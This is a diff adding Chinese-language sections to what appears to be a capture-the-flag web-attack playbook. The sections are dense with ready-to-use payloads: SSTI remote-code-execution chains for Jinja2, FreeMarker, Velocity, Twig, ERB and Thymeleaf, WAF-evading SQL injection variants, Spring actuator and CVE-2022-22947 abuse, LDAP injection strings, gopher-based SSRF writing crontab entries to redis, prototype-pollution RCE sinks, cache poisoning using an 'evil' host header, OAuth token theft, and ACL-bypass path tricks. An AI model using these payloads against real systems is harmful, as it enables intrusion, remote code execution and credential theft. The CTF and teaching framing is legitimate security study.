@@ -259,3 +259,140 @@ When a Next.js/React/SPA app has no obvious API entry:
 - Gradio 4.12: /component_server needs session_hash+component_id;
   move_resource_to_blocklist 500s (removed) ⇒ prefer /file= with allowed
   /tmp/gradio prefix or upload-path tricks.
+
+## SSTI 深挖（签名/主题/模板预览/个人资料展示 = 服务端渲染面，见即主攻 SSTI）
+
+**触发词**：个人签名/资料展示、文章模板预览、自定义主题渲染、任何"你的输入会被服务端渲染后展示"。
+
+1. **引擎指纹**（先发探测串定位引擎，再上对应 payload）：
+   - `${7*7}` → 49: FreeMarker/Velocity(旧)/Mako; `${7*7}` 原样: Thymeleaf 可能
+   - `{{7*7}}` → 49: Jinja2/Twig(nunjucks); `{{7*'7'}}` → 7777777 Jinja2, 49 Twig
+   - `<%= 7*7 %>` ERB; `#{7*7}` Ruby Slim/Thymeleaf; `*{7*7}` Spring Thymeleaf
+   - `{{7*7}}` 报错页看框架名；Bottle 常配 Jinja2（SimpleTemplate 无沙箱）
+2. **Jinja2 RCE 链**（`__class__` 被过滤时逐级换）：
+   - `{{lipsum.__globals__['os'].popen('cat /flag*').read()}}`（最短，先试）
+   - `{{cycler.__init__.__globals__.os.popen('id').read()}}`
+   - `{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}`
+   - `|attr()` 链绕点号过滤：`{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()...}}`
+   - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'os' in str(x) %}{{x.popen('cat /flag*').read()}}{% endif %}{% endfor %}`
+3. **其他引擎 RCE**：
+   - FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag*")}`
+   - Velocity: `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('cat /flag*'))`
+   - Twig: `{{['cat /flag*']|map('system')}}` 或 `_self.env.registerUndefinedFilterCallback("exec")` 链
+   - ERB(Ruby): `<%= system('cat /flag*') %>` 或 `` <%= `cat /flag*` %> ``
+   - Thymeleaf: `__${T(java.lang.Runtime).getRuntime().exec("cat /flag*")}__::..`（URL path 里）
+4. **无回显（盲 SSTI）**：`{{7*7}}` 不回显时用时间盲注 `{{ ''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True) }}` 或 OOB：让 payload curl 内网回连；输出重定向到静态目录再 HTTP 读。
+5. **过滤绕过**：关键词黑名单（class/os/import）→ 十六进制属性访问 `__class__`→`\x5f\x5fclass\x5f\x5f`、attr 过滤器拼接 `'__cla'+'ss__'`、用 `request`/`session`/`config` 对象替代、`{%%}` 语法替代 `{{}}`。
+
+## WAF 绕过 SQLi 变形矩阵（题面明示"照搬公开 payload 无效"时必读）
+
+按序重放同一注入的变形（一处 WAF 规则挡不全所有形态）：
+- 大小写混合 `UnIoN SeLeCt`；内联注释 `UN/**/ION SEL/**/ECT`；URL 双编码 `%2553elect`
+- 关键词拆分：`uni%0aon`（换行）、`uni\u006fn`（JSON 体）、`+. ` 拼接（MySQL `UNION/*!12345SELECT*/`版本注释）
+- 科学/替代写法：`or` → `||`、`and` → `&&`、空格 → `/**/` `%09` `%0a` `+`
+- 无回显走盲注：布尔（`1&&substr(database(),1,1)='x'`）、时间（`1&&sleep(5)`/PG `pg_sleep(5)`）、报错（`extractvalue(1,concat(0x7e,version()))`、PG `::text` cast 报错）
+- **python-requests 手写脚本逐字符二分**，别指望 sqlmap 一次过——tamper 链 `tamper=space2comment,between,randomcase,charencode` 逐个试
+- WAF 在应用层（统一过滤器）时：找**未过过滤器的参数**（Header X-Forwarded-For/Referer/UA、JSON 嵌套键、数组参数 `id[]=`、路径参数）注入
+
+## Spring Boot 裸应用（无 index 页 = actuator/组件面）
+
+1. `/actuator` `/actuator/env` `/actuator/heapdump` `/actuator/configprops` `/actuator/beans` `/actuator/mappings` `/actuator/trace`(`/httptrace`)
+2. **heapdump 是金矿**：下载后 `strings heapdump | grep -iE 'flag|secret|password|jdbc'`，或 MAT/Eclipse 分析（凭据常在 DataSource/连接池对象里）
+3. env 泄漏 → 拿到内部凭据打 eureka/nacos/redis；`/actuator/gateway` 有 route 注入 RCE（Spring Cloud Gateway CVE-2022-22947: `POST /actuator/gateway/routes/{id}` SpEL）
+4. jolokia（`/actuator/jolokia/list`）→ MBean `ch.qos.logback` JNDI 或 `reloadByURL` file:// RCE 链
+5. 报错页 `/error` 看依赖组件版本 → 对应 CVE（fastjson/shiro/log4j 见 playbook_exploit）
+6. 没开 actuator：fuzz `/api` `/druid` `/swagger-ui.html` `/v2/api-docs` `/api-docs`（druid 未授权 `/druid/index.html` 直接看 SQL 监控）
+
+## 多租户数据服务越权（Presto/Hive/共享数据库类——盲目猜 flag 前必读）
+
+1. 先枚举系统表：`SHOW TABLES FROM information_schema`、`SELECT * FROM system.metadata.materialized_views`、Presto `system.jdbc.tables`；JMX connector `system.jmx.*` 泄漏配置
+2. 租户隔离常在**查询改写层**（Ranger/Sentry 策略或 proxy SQL 改写）而非引擎层 → 试：CRLF/注释截断改写（`/*` 不闭合让改写层和引擎看到不同 SQL）、大小写/同义改写（`catalog.schema.table` 三段全限定名绕 schema 补全）、子查询/CTE/视图嵌套（策略只匹配表层）
+3. 函数旁路：`table_sample`、`UNNEST`、`array_agg` 聚合他人行、`ANSI` 模式差异
+4. JDBC URL/连接池配置错误 → information_schema 直连其他 catalog：`SELECT * FROM "other-tenant-db".public.users`
+5. 错误提交超过 3 次说明在盲猜——停下来 dump information_schema 全表结构再打
+
+## GraphQL 面（见到 /graphql、application/json + query 字段即套用）
+
+1. **内省**：`{__schema{types{name fields{name}}}}` 拿全 schema → 找 admin/secret/flag 字段；内省被禁时：报错建议（故意拼错字段名，错误信息逐字提示候选）、Clairvoyance 字典爆破 schema、抓 JS 里的 query 片段
+2. **IDOR 高发**：mutation 参数里的 id 直接改；`user(id:2)`/`node(id:"...")` 换 base64 编码的 ID（`atob/btoa`）
+3. **批量/别名绕限**：`alias1: field(...) alias2: field(...)` 单请求打多次，绕速率限制与暴力枚举；**批量 mutation**（数组内并发同操作）打竞态
+4. **查询深度 DoS 忎的**，但**循环引用对象**（user.posts.user...）可能把隐藏关系带出来
+5. 无鉴权字段直接查：`{flag}` `{secrets}` ——先试字段名再内省（内省可能关了但字段没关）
+
+## LDAP / 目录服务集成（密钥托管/SSO/"企业目录"字样）
+
+1. **LDAP 注入**（登录框/搜索框进 LDAP filter）：`*` 万能（`user=*&password=*`）、
+   `*)(uid=*))(|(uid=*` 闭合注入、布尔盲注 `*)(objectClass=*))%00` 逐字符截取属性
+2. **用户枚举**：响应差异（时延/文案）区分存在性——目录集成的登录口几乎总有
+3. 匿名绑定：空 DN+空密码 `ldapwhoami -x -h host`；默认凭据 `admin/admin`、
+   `cn=admin,dc=example,dc=com`
+4. Vault/密钥服务形态：`/v1/sys/health` `/v1/sys/mounts` 探未授权；token 在
+   env/配置里泄漏后 `VAULT_TOKEN=xxx vault kv get secret/...`；unseal key 泄漏→
+   完全接管；LDAP auth 绑定账号的密码常硬编码在配置（读配置文件是正路）
+
+## SSRF 深化：从外层应用到内网数据层
+
+目标形态："机密在不在互联网上的数据库/隔离层"= 必须链式 SSRF：
+1. **找 fetch 点**：URL 参数、webhook/回调配置、头像/导入/导出、PDF 生成、
+   代理/预览功能、Sitemap/OAuth 回调
+2. **内网测绘**：先 127.0.0.1 常见端口（6379 redis / 3306 / 5432 / 27017 /
+   8500 consul / 8200 vault / 2375 docker），再扫内网段存活
+3. **协议交互**：redis `gopher://` 写 crontab/SSH key；FastCGI `gopher://` RCE；
+   dict:// 探端口指纹；`file://` 读配置拿内网拓扑与凭据
+4. **盲 SSRF**（无回显）：302 跳转探测（自控页面重定向到目标，按响应码/时延判断）；
+   DNS OOB；错误差异（连接拒绝 vs 超时 = 端口开闭）
+5. **二次注入**：SSRF 只拿到内网页面 → 页面里再找注入点（内网应用无 WAF，
+   一条 SQLi 直取 flag）
+
+## 原型污染 / 类污染（Node"神秘对象行为变化"题；Python 应用同样有 class pollution）
+
+1. **JS 检测**：任何递归 merge/深拷贝/JSON body 直接进对象的地方，发
+   `{"__proto__":{"x":"y"}}` 后查 `Object.prototype` 是否被写（回显/行为变化/报错差异）；
+   绕过键过滤：`constructor.prototype`（`{"constructor":{"prototype":{"x":1}}}`）
+2. **客户端 gadget 链**：污染后找 sink——statusbar/`pollTitle`（旧模板）、
+   `config.vars`、`sequence`（DOM XSS），污染 `NODE_OPTIONS`/`shell` 触发 RCE
+3. **服务端 sink**（Node）：`child_process` options（污染 `shell:true`+`NODE_OPTIONS=--require=...`）、
+   Express `view options`/`views` 改渲染引擎、EJS 的 `outputFunctionName` 直接 RCE、
+   `errorHandler` 改函数
+4. **Python class pollution**（merge/`setattr` 递归更新用户输入时）：污染
+   `__init__.__globals__` 下任意全局（改 `SECRET_KEY`、框架配置），或
+   `subprocess.Popen.__init__.__defaults__` 注入 `shell=True`
+5. 与其他洞**组合**是主流形态：污染 → 绕权限检查 → SSRF/文件读 → RCE 逐级上链
+
+## Web 缓存投毒/缓存欺骗（有 CDN/缓存头/静态化痕迹时）
+
+1. 识别缓存键：`X-Forwarded-Host`/`X-Original-URL` 等未键入的输入 →
+   `curl -H "X-Forwarded-Host: a.@evil" 目标页` 看反射
+2. 投毒 gadget：不键入的 header 反射进页面/跳转 → 缓存后打所有访问者；
+   unkeyed cookie 同理
+3. 缓存欺骗：`/api/me/nonexist.css` 类路径让缓存器存下带凭据的 API 响应
+   （路径后缀伪装成静态资源）→ 从缓存读别人会话数据
+4. Web cache deception 的变体：`/profile%0a.css`、大小写、`;.js`
+
+## OAuth / OIDC 流程攻击（"用 XX 登录"、callback、state 参数出现时）
+
+1. **redirect_uri 校验缺陷**：`?redirect_uri=evil` / `//evil` / 子域跳板 /
+   `redirect_uri=合法#` 截断 / 参数污染 `&redirect_uri=evil`——偷 code/token
+2. **state 缺失** → CSRF 绑定别人账号；**PKCE 缺失** → 截 code 自兑
+3. **隐式流 token** 进 URL → Referrer/日志泄漏；token 注入 session 固定
+4. **账号接管链**：注册同 email → 第三方登录自动绑定已有账号（email 未验证时）
+5. **nonce/JWKS 弱点**：`alg:none`/`HS256 密钥混淆`（拿公钥当 HMAC 密钥签 token）；
+   `kid` 注入路径穿越指自建 JWK
+
+## HTTP 方法篡改与动词越权（2025 高频形态）
+
+1. 被 403 的路径换动词：`GET /admin` 403 → `HEAD`/`POST`/`PATCH`/`OPTIONS`/`CONNECT`
+   逐个试；`X-HTTP-Method-Override: DELETE` 头覆盖
+2. 路径变形绕路由 ACL：`//admin`、`/admin/.`、`/;/admin`、`/%2e/admin`、
+   `..;/admin`（Tomcat/Java 高发）、大小写、尾部 `/.` 与 `%00`
+3. HTTP/1.0 短接、绝对 URI（`GET http://host/admin`）绕反代路径规则
+4. CORS 预检绕过：`Content-Type: text/plain` 发 JSON；`X-Requested-With` 删掉
+
+## WebSocket 攻击面（页面有 ws:// / wss:// / 长连接时）
+
+1. CSWSH：跨站 WebSocket 劫持——无 Origin 校验时带 cookie 从恶意页连 ws，
+   构造 `new WebSocket("wss://target/ws")`
+2. 消息注入：抓协议格式后改 id/角色/命令字段（IDOR over ws）；
+   重放+并发打竞态
+3. 鉴权缺失：直接裸连 ws 端点发订阅消息读他人数据
+4. 消息解析漏洞：JSON 深层原型污染、二进制解析内存破坏（配 reversing）
